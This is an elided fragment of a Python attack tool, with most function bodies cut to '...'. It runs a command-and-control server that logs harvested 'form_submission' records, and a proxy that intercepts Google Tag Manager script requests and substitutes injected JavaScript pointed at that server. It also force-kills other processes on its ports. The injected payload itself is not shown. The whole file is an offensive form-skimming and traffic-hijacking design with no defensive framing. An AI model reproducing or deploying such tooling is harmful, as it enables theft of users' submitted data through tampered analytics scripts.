...
def load_profile(profile_path):
    if not os.path.exists(profile_path):
        print(f"[-] Profile not found: {profile_path}. Falling back to default settings.")
        return {
            "platform": "generic",
...
def clear_stale_ports(c2_port, proxy_port):
    ...
    for port in [c2_port, proxy_port]:
        # Safely clear processes holding the ports without touching our own PID
        try:
            ...
            if res.returncode == 0 and res.stdout.strip():
                for p in res.stdout.strip().split():
                    ...
                    if pid_int != current_pid:
                        os.kill(pid_int, 9)
                        print(f"[*] Cleared stale process {pid_int} on port {port}")
        except Exception:
            pass
        ...
        def do_POST(self):
            ...
            try:
                ...
                if action == 'form_submission':
                    ...
                    print(f"    [!] TELEMETRY DATA EXTRACTED: {len(records) if isinstance(records, list) else 'Data'} records acquired.")
...
def run_proxy(c2_port, proxy_port, profile):
    class ProxyHandler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            ...
            if "googletagmanager.com" in self.path or "gtag/js" in self.path or "gtm.js" in self.path:
                print(f"[!] [PAYLOAD TRIGGER] Injecting profile ({profile.get('platform', 'custom')}): {profile.get('platform', 'Custom')}...")
                ...
                payload = raw_js.replace("C2_PORT_PLACEHOLDER", str(c2_port)) \
...
def main():
    ...
    threading.Thread(target=run_proxy, args=(args.c2_port, args.proxy_port, profile), daemon=True).start()
